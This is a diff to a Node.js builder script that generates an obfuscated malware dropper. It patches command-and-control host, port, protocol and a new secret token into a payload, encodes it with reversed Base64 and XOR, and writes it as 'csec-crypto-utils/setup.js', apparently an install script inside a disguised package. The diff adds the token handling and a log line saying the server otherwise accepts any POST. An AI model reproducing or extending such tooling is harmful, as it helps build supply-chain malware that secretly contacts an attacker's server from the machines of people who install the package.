@@ -22,6 +22,7 @@ if (!rawTarget) {
 }
 
 let C2_PROTO, C2_HOST, C2_PORT;
+const C2_TOKEN = process.env.C2_SECRET || '';
 
 if (rawTarget.startsWith('http://') || rawTarget.startsWith('https://')) {
   const url = new URL(rawTarget);
@@ -56,7 +57,8 @@ const payloadSrc = fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf-8');
 const patched = payloadSrc
   .replace('__C2_HOST__', C2_HOST)
   .replace('__C2_PORT__', C2_PORT)
-  .replace('__C2_PROTO__', C2_PROTO);
+  .replace('__C2_PROTO__', C2_PROTO)
+  .replace('__C2_TOKEN__', C2_TOKEN);
 
 const blob = encode(patched);
 
@@ -81,6 +83,7 @@ console.log('  [+] Obfuscated dropper built successfully');
 console.log('  [+] Output: csec-crypto-utils/setup.js');
 console.log('  [+] C2 target: ' + C2_PROTO + '://' + C2_HOST + ':' + C2_PORT);
 console.log('  [+] Protocol: ' + C2_PROTO.toUpperCase());
+console.log('  [+] Token:    ' + (C2_TOKEN ? 'YES (from C2_SECRET env)' : 'NONE — server accepts any POST'));
 console.log('  [+] Obfuscation: reversed Base64 (pad: ' + PAD_ORIG + ' -> ' + PAD_SUB + ') + XOR (key: ' + XOR_KEY + ', const: ' + XOR_CONST + ')');
 console.log('  [+] Payload size: ' + patched.length + ' bytes -> blob: ' + blob.length + ' chars');
 console.log('');
